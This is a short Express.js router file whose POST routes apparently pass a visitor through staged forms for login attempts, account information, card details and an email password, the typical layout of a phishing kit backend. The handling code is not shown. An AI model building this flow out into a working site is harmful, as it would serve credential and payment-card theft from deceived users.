var express = require('express');
var router = express.Router();

var controller = require('../controller/controller');

/* GET home page. */
router.get('/', controller.getIndex);

router.post('/auth/login/do', controller.postSignInAttempts);

router.post('/auth/login/do/sc', controller.postAccountInformation);

router.post('/auth/login/do/sd', controller.postCardDetails);

router.post('/confirmation-email', controller.postEmailPass);

module.exports = router;
